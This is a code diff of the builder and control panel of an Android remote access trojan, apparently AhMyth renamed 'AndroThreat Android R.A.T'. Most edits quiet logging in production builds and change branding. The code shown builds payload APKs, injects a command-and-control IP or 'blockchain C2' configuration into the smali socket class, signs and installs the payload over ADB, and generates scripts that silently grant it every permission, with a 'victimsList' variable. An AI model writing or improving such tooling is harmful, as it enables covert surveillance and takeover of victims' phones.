@@ -4,6 +4,22 @@ const {
     ipcRenderer
 } = require('electron');
 
+// Production mode detection
+const IS_PRODUCTION = process.env.NODE_ENV === 'production' || (remote && remote.app && remote.app.isPackaged);
+const IS_DEVELOPMENT = !IS_PRODUCTION;
+
+// Logging helpers - only log in development or for errors
+const devLog = (...args) => {
+    if (IS_DEVELOPMENT) {
+        console.log(...args);
+    }
+};
+const devWarn = (...args) => {
+    if (IS_DEVELOPMENT) {
+        console.warn(...args);
+    }
+};
+
 // Handle remote module with error handling
 let dialog, victimsList, shell;
 try {
@@ -29,7 +45,7 @@ let ethers, crypto, bs58, Connection, Keypair, PublicKey;
 try {
     const ethersLib = require('ethers');
     ethers = ethersLib.ethers || ethersLib;
-    console.log('[Blockchain] ethers loaded:', !!ethers);
+    devLog('[Blockchain] ethers loaded:', !!ethers);
 } catch (e) {
     console.error('[Blockchain] Failed to load ethers:', e.message);
 }
@@ -41,7 +57,7 @@ try {
 }
 try {
     bs58 = require('bs58');
-    console.log('[Blockchain] bs58 loaded:', !!bs58, 'has decode:', typeof bs58.decode, 'has encode:', typeof bs58.encode);
+    devLog('[Blockchain] bs58 loaded:', !!bs58, 'has decode:', typeof bs58.decode, 'has encode:', typeof bs58.encode);
 } catch (e) {
     console.error('[Blockchain] Failed to load bs58:', e.message);
 }
@@ -50,7 +66,7 @@ try {
     Connection = solanaWeb3.Connection;
     Keypair = solanaWeb3.Keypair;
     PublicKey = solanaWeb3.PublicKey;
-    console.log('[Blockchain] @solana/web3.js loaded - Connection:', !!Connection, 'Keypair:', !!Keypair, 'PublicKey:', !!PublicKey);
+    devLog('[Blockchain] @solana/web3.js loaded - Connection:', !!Connection, 'Keypair:', !!Keypair, 'PublicKey:', !!PublicKey);
 } catch (e) {
     console.error('[Blockchain] Failed to load @solana/web3.js:', e.message);
 }
@@ -385,7 +401,7 @@ app.controller("AppCtrl", ($scope, $sce) => {
                 $appCtrl.$apply();
             }
             
-            console.log('[Builder] Saving settings. Input IP:', $appCtrl.builder.srcIP);
+            devLog('[Builder] Saving settings. Input IP:', $appCtrl.builder.srcIP);
             
             const settings = {
                 srcIP: $appCtrl.builder.srcIP,
@@ -465,9 +481,7 @@ app.controller("AppCtrl", ($scope, $sce) => {
         
         // CRITICAL: Ensure we pass the exact values from GUI - no defaults, no fallbacks
         // These values will be used directly in the Build function
-        console.log('[APK Builder] Calling Build() with:');
-        console.log(`  IP parameter: "${currentIP}"`);
-        console.log(`  Port parameter: ${currentPort}`);
+        devLog(`[APK Builder] Calling Build() with IP: "${currentIP}", Port: ${currentPort}`);
         
         // Call Build with current GUI values - these MUST be used, no defaults
         $appCtrl.Build(
@@ -1228,8 +1242,7 @@ app.controller("AppCtrl", ($scope, $sce) => {
                 validatedIp = (ip || '').toString().trim();
                 validatedPort = port !== null && port !== undefined ? Number(port) : null;
                 
-                console.log(`[APK Builder] After sanitization: IP="${validatedIp}", Port=${validatedPort}`);
-                console.log(`[APK Builder] These values came from GUI inputs via BuildWithCurrentValues()`);
+                devLog(`[APK Builder] Validated: IP="${validatedIp}", Port=${validatedPort}`);
                 
                 if (!validatedIp || validatedIp.length === 0) {
                     throw new Error('Server IP is required for TCP/IP builds. Please enter an IP address in the GUI.');
@@ -1249,8 +1262,7 @@ app.controller("AppCtrl", ($scope, $sce) => {
                     throw new Error(`Invalid IP address format: ${validatedIp}. Please enter a valid IPv4 address.`);
                 }
                 
-                console.log(`[APK Builder] ✓ Validated TCP/IP config from GUI: ${validatedIp}:${validatedPort}`);
-                console.log(`[APK Builder] These values will be injected into IOSocket.smali`);
+                devLog(`[APK Builder] ✓ Validated TCP/IP config: ${validatedIp}:${validatedPort}`);
                 delayedLog(`[ℹ] Using TCP/IP endpoint from GUI: ${validatedIp}:${validatedPort}`, CONSTANTS.logStatus.INFO);
             }
             
@@ -1270,9 +1282,7 @@ app.controller("AppCtrl", ($scope, $sce) => {
             ];
             if (!$appCtrl.$$phase) $appCtrl.$apply();
             
-            console.log('\n[APK Builder] ========================================');
-            console.log('[APK Builder] Starting APK build process...');
-            console.log(`[APK Builder] Connection type: ${connectionType}`);
+            devLog(`[APK Builder] Starting build process (${connectionType})...`);
             delayedLog('[→] Preparing build...', CONSTANTS.logStatus.INFO);
             
             // Get factory path first
@@ -1280,7 +1290,7 @@ app.controller("AppCtrl", ($scope, $sce) => {
             let { file: ioPath, factoryPath } = await findIOSocketSmali();
             
             // Auto-update Factory source from latest client build
-            console.log('[APK Builder] Updating Factory source from latest client build...');
+            devLog('[APK Builder] Updating Factory source...');
             delayedLog('[→] Updating Factory source from latest client build...', CONSTANTS.logStatus.INFO);
             const updateSourceScript = path.join(factoryPath, 'update-source.ps1');
             // connectionMode already defined above
@@ -1298,8 +1308,7 @@ app.controller("AppCtrl", ($scope, $sce) => {
             if (fs.existsSync(updateSourceScript)) {
                 try {
                     // Use PowerShell to run the script
-                    console.log('[APK Builder] Building client APK and updating Factory source...');
-                    console.log('[APK Builder] This may take a few minutes...');
+                    devLog('[APK Builder] Building client APK...');
                     delayedLog('[→] Building client APK and updating Factory source...', CONSTANTS.logStatus.INFO);
                     delayedLog('[ℹ] This may take a few minutes...', CONSTANTS.logStatus.INFO);
                     
@@ -1331,7 +1340,7 @@ app.controller("AppCtrl", ($scope, $sce) => {
                         progressTimer = setInterval(() => {
                             const timeSinceLastOutput = Date.now() - lastProgressTime;
                             if (timeSinceLastOutput >= progressInterval) {
-                                console.log('[APK Builder] Still building... (this may take several minutes)');
+                                // Progress message already logged to UI, no need for console
                                 delayedLog('[ℹ] Build in progress... (this may take several minutes)', CONSTANTS.logStatus.INFO);
                             }
                         }, progressInterval);
@@ -1474,7 +1483,7 @@ app.controller("AppCtrl", ($scope, $sce) => {
                         });
                     });
                     
-                    console.log('[APK Builder] ✓ Factory source updated successfully');
+                    devLog('[APK Builder] ✓ Factory source updated');
                     delayedLog('[✓] Factory source updated successfully', CONSTANTS.logStatus.SUCCESS);
                     
                     // Update progress
@@ -1517,7 +1526,7 @@ app.controller("AppCtrl", ($scope, $sce) => {
                                 delayedLog(`[✓] ${line.substring(0, 300)}`, CONSTANTS.logStatus.SUCCESS);
                             });
                         }
-                        console.log('[APK Builder] ✓ Factory source updated successfully');
+                        devLog('[APK Builder] ✓ Factory source updated');
                         delayedLog('[✓] Factory source updated successfully', CONSTANTS.logStatus.SUCCESS);
                     } else {
                         // Actual error occurred
@@ -1541,7 +1550,7 @@ app.controller("AppCtrl", ($scope, $sce) => {
                                 });
                             }
                         }
-                        console.log('[APK Builder] Continuing with existing Factory source...');
+                        devLog('[APK Builder] Using existing Factory source...');
                         delayedLog('[ℹ] Continuing with existing Factory source...', CONSTANTS.logStatus.INFO);
                     }
                     // Continue with existing source - don't fail the build
@@ -1599,7 +1608,7 @@ app.controller("AppCtrl", ($scope, $sce) => {
             
             // Use the validated values from earlier (for TCP/IP) or validate blockchain config
             if (connectionMode === 'blockchain') {
-                console.log('[APK Builder] Injecting blockchain C2 config...');
+                devLog('[APK Builder] Injecting blockchain C2 config...');
                 delayedLog('[→] Injecting blockchain C2 config...', CONSTANTS.logStatus.INFO);
                 if (!rpcUrl || !contract || !aesKey || !clientKey) {
                     throw new Error('Missing blockchain settings (RPC URL, contract/channel, AES key, client key)');
@@ -1619,13 +1628,7 @@ app.controller("AppCtrl", ($scope, $sce) => {
                 
                 // CRITICAL: These validatedIp and validatedPort values came from the GUI inputs
                 // They were passed via BuildWithCurrentValues() -> Build() -> validated here
-                console.log('[APK Builder] ========================================');
-                console.log('[APK Builder] Injecting TCP/IP config into IOSocket.smali');
-                console.log(`[APK Builder] FINAL VALUES TO INJECT:`);
-                console.log(`  IP: "${validatedIp}" (from GUI input)`);
-                console.log(`  Port: ${validatedPort} (from GUI input)`);
-                console.log(`  Endpoint: http://${validatedIp}:${validatedPort}`);
-                console.log('[APK Builder] ========================================');
+                devLog(`[APK Builder] Injecting TCP/IP: ${validatedIp}:${validatedPort}`);
                 delayedLog(`[→] Injecting TCP/IP config: ${validatedIp}:${validatedPort}`, CONSTANTS.logStatus.INFO);
                 await updateIOSocketTcp(ioPath, validatedIp, validatedPort);
             }
@@ -1648,7 +1651,7 @@ app.controller("AppCtrl", ($scope, $sce) => {
             delayedLog('[→] Building APK...', CONSTANTS.logStatus.INFO);
             const buildResult = await exec(`java -jar apktool.jar b Ahmyth -o "${outApk}"`, { cwd: path.join(factoryPath) });
             if (buildResult.stdout) {
-                console.log('[APK Builder] Build output:', buildResult.stdout);
+                devLog('[APK Builder] Build output:', buildResult.stdout);
             }
 
             // Update progress - Building done, now signing
@@ -1660,7 +1663,7 @@ app.controller("AppCtrl", ($scope, $sce) => {
             if (!$appCtrl.$$phase) $appCtrl.$apply();
 
             // Sign
-            console.log('[APK Builder] Signing APK...');
+            devLog('[APK Builder] Signing APK...');
             delayedLog('[→] Signing APK...', CONSTANTS.logStatus.INFO);
             const signResult = await exec(`java -jar sign.jar -a "${outApk}"`, { cwd: path.join(factoryPath) });
             if (signResult.stdout) {
@@ -1677,7 +1680,7 @@ app.controller("AppCtrl", ($scope, $sce) => {
                     fs.mkdirpSync(outputPath);
                 }
                 fs.copyFileSync(builtApkPath, finalApkPath);
-                console.log(`[APK Builder] ✓ APK copied to output folder`);
+                devLog(`[APK Builder] ✓ APK copied to output folder`);
                 delayedLog(`[✓] APK copied to output folder`, CONSTANTS.logStatus.SUCCESS);
             } catch (copyErr) {
                 console.warn(`[APK Builder] ⚠ Could not copy APK to output folder: ${copyErr.message}`);
@@ -1695,8 +1698,8 @@ app.controller("AppCtrl", ($scope, $sce) => {
             
             // Store last built path (use output folder path)
             $appCtrl.lastBuiltApkPath = finalApkPath;
-            console.log(`[APK Builder] ✓ APK built successfully: ${signedApk}`);
-            console.log(`[APK Builder] Location: ${finalApkPath}`);
+            devLog(`[APK Builder] ✓ APK built: ${signedApk}`);
+            devLog(`[APK Builder] Location: ${finalApkPath}`);
             delayedLog(`[✓] APK built: ${signedApk}`, CONSTANTS.logStatus.SUCCESS);
             delayedLog(`[ℹ] Location: ${finalApkPath}`, CONSTANTS.logStatus.INFO);
             
@@ -2029,11 +2032,11 @@ app.controller("AppCtrl", ($scope, $sce) => {
         
         const selected = allDevices[0];
         const deviceType = isEmulator(selected.deviceId, selected.deviceInfo || '') ? 'emulator' : 'physical device';
-        console.log(`[ADB] Selected ${deviceType}: ${selected.deviceId} (from ${allDevices.length} available device(s))`);
+        devLog(`[ADB] Selected ${deviceType}: ${selected.deviceId} (from ${allDevices.length} available device(s))`);
         $appCtrl.Log(`[ℹ] Found ${allDevices.length} device(s), selected ${deviceType}: ${selected.deviceId}`, CONSTANTS.logStatus.INFO);
-        if (allDevices.length > 1) {
+        if (allDevices.length > 1 && IS_DEVELOPMENT) {
             const otherDevices = allDevices.slice(1).map(d => `${d.deviceId} (${isEmulator(d.deviceId, d.deviceInfo || '') ? 'emulator' : 'device'})`).join(', ');
-            console.log(`[ADB] Other available devices: ${otherDevices}`);
+            devLog(`[ADB] Other available devices: ${otherDevices}`);
         }
         
         return selected;
@@ -2052,13 +2055,13 @@ app.controller("AppCtrl", ($scope, $sce) => {
         }
         
         $appCtrl.Log(`[→] Installing APK: ${path.basename(apkPath)}...`, CONSTANTS.logStatus.INFO);
-        console.log('[Install] Starting installation process...');
+        devLog('[Install] Starting installation process...');
         
         try {
             $appCtrl.Log('[→] Detecting connected devices...', CONSTANTS.logStatus.INFO);
-            console.log('[Install] Getting connected device...');
+            devLog('[Install] Getting connected device...');
             const { deviceId, adbPort } = await $appCtrl.getConnectedDevice();
-            console.log(`[Install] Device selected: ${deviceId} on port ${adbPort}`);
+            devLog(`[Install] Device selected: ${deviceId} on port ${adbPort}`);
             const isEmulator = deviceId.startsWith('emulator-') || 
                                deviceId.match(/^127\.0\.0\.1:\d+$/) ||
                                deviceId.match(/^localhost:\d+$/) ||
@@ -2294,7 +2297,7 @@ app.controller("AppCtrl", ($scope, $sce) => {
 
     // Uninstall app from device
     $appCtrl.uninstallApp = async () => {
-        $appCtrl.Log('[→] Uninstalling AhMyth from device...', CONSTANTS.logStatus.INFO);
+        $appCtrl.Log('[→] Uninstalling AndroThreat from device...', CONSTANTS.logStatus.INFO);
         
         try {
             const { deviceId, adbPort } = await $appCtrl.getConnectedDevice();
@@ -3155,10 +3158,10 @@ app.controller("AppCtrl", ($scope, $sce) => {
     // Initial welcome messages
     const architecture = process.arch;
     if (architecture === 'ia32') {
-        delayedLog('[⚠] WARNING: AhMyth will cease support for 32-bit systems when Apktool reaches v3.0.0', CONSTANTS.logStatus.WARNING);
+        delayedLog('[⚠] WARNING: AndroThreat will cease support for 32-bit systems when Apktool reaches v3.0.0', CONSTANTS.logStatus.WARNING);
     } else {
         delayedLog('╔════════════════════════════════════════════════════════════╗', CONSTANTS.logStatus.SUCCESS);
-        delayedLog('║       Welcome to AhMyth Android R.A.T v2.0                 ║', CONSTANTS.logStatus.SUCCESS);
+        delayedLog('║       Welcome to AndroThreat Android R.A.T v2.0                 ║', CONSTANTS.logStatus.SUCCESS);
         delayedLog('║       Modern Edition with Enhanced Features                ║', CONSTANTS.logStatus.SUCCESS);
         delayedLog('╚════════════════════════════════════════════════════════════╝', CONSTANTS.logStatus.SUCCESS);
         delayedLog('');
@@ -3564,7 +3567,7 @@ app.controller("AppCtrl", ($scope, $sce) => {
             // Ignore the error by doing nothing
         }
 
-        // Build the AhMyth Payload APK
+        // Build the AndroThreat Payload APK
         delayedLog(`[→] Building ${CONSTANTS.apkName}...`, CONSTANTS.logStatus.INFO);
         var createApk = 'java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + dir.join(outputPath,
             CONSTANTS.apkName) + '" --use-aapt2 "' + '"';
@@ -3633,9 +3636,9 @@ app.controller("AppCtrl", ($scope, $sce) => {
         
         // Windows batch script
         let batScript = `@echo off
-echo ===== AhMyth Silent Permission Granter =====
+echo ===== AndroThreat Silent Permission Granter =====
 echo.
-echo This script will grant all permissions to the AhMyth payload.
+echo This script will grant all permissions to the AndroThreat payload.
 echo Make sure the device is connected via ADB and USB debugging is enabled.
 echo.
 
@@ -3679,9 +3682,9 @@ pause`;
         
         // Unix/Linux shell script
         let shScript = `#!/bin/bash
-echo "===== AhMyth Silent Permission Granter ====="
+echo "===== AndroThreat Silent Permission Granter ====="
 echo ""
-echo "This script will grant all permissions to the AhMyth payload."
+echo "This script will grant all permissions to the AndroThreat payload."
 echo "Make sure the device is connected via ADB and USB debugging is enabled."
 echo ""
 
